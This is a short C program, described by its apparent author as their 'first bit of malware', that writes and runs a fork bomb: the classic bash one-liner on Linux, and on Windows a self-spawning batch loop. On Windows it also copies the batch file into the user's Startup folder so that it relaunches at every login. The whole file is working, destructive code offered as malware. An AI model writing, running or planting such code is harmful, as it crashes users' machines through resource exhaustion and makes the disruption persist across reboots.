#ifdef __linux__ 
#define OS 0 
#elif _WIN32
#define OS 1
#endif

#include <stdio.h>
#include <stdlib.h>

// first bit of malware I have written. Cool stuff
// make sure this program has uid of regualr user.
// it has system() calls which are easily exploitable.
int main()
{
	char *fileName = ( OS == 0 ) ? "Fork.bash" : "Fork.bat";
	
	FILE *file = fopen( fileName, "w+" );
	if( OS == 1 )
	{

		fprintf( file, "@echo off\n" );
		fprintf( file, ":a\n" );
		fprintf( file, "@echo \n" );
		fprintf( file, "start Fork.bat\n" );
		fprintf( file, "goto a\n" );
	} 
	else if( OS == 0 )
	{
		fprintf( file, ":(){ :|: & };:" );
	}

	// Close the file print stream
	fclose( file );
	
	// if the os is windows
	if( OS == 1 )
	{
		// Copy the Fork bomb into the windows startup directory
		// I know this is exploitable, but this program is only
		// ment to be run on on a machine once. It is not intended
		// for long term use on a computer.
		system( "copy \"Fork.bat\" \"%USERPROFILE%\\Start Menu\\Programs\\Startup\"" );
	}

	// Execute the current directory's version of Fork.bat
	system( (OS == 0) ? "./Fork.bash" : "Fork.bat" );

	return 0;
}
